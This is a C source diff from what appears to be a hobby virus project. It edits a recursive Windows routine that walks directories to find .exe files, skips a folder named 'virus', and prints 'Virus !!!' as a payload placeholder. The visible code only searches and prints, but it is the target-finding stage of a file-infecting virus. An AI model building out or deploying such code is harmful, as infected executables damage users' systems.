@@ -40,7 +40,7 @@ int main(int argc,char* argv[])
    // get_exe_file("*");
    
    //XXX: find files may change to  ".\\"..
-    findfiles("./");
+   //findfiles("./");
 	get_exe_file(haking_text_path);
 	//payload
 	printf("Virus !!!\n");
@@ -248,7 +248,7 @@ void get_exe_file(char path[MAXSIZE]){
     char dir_path[MAXSIZE];
 	char next_dir_path[MAXSIZE];
 
-	sprintf(dir_path,"%s\\",path);
+	sprintf(dir_path,"%s",path);
 	printf("dir %s\n",dir_path);
     if( (fHandle=_findfirst( dir_path, &fileinfo )) == -1L ) 
     {
@@ -258,15 +258,15 @@ void get_exe_file(char path[MAXSIZE]){
     else{
         do{
 			if((fileinfo.attrib & _A_SUBDIR)){
-				if(strcmp(fileinfo.name,".") != 0 && strcmp(fileinfo.name,"..") != 0) 
-					sprintf(next_dir_path,"%s%s",dir_path, fileinfo.name);
-				    printf("find folder %s\n",dir_path);
+				if(strcmp(fileinfo.name,".") != 0 && strcmp(fileinfo.name,"..") != 0 && strcmp(fileinfo.name,"virus")!=0) 
+					sprintf(next_dir_path,"%s\\%s",dir_path, fileinfo.name);
+				    printf("find folder %s\n",next_dir_path);
 					get_exe_file(next_dir_path);
 			}
 			else{
 				
 			    printf("FILE find");
-				length=strlen(fileinfo.name);
+				int length=strlen(fileinfo.name);
 				if (strncmp(fileinfo.name + length - 4, ".exe", 4) == 0) {
 				    i ++;
 				    printf( "find exe file:%s \n", fileinfo.name);
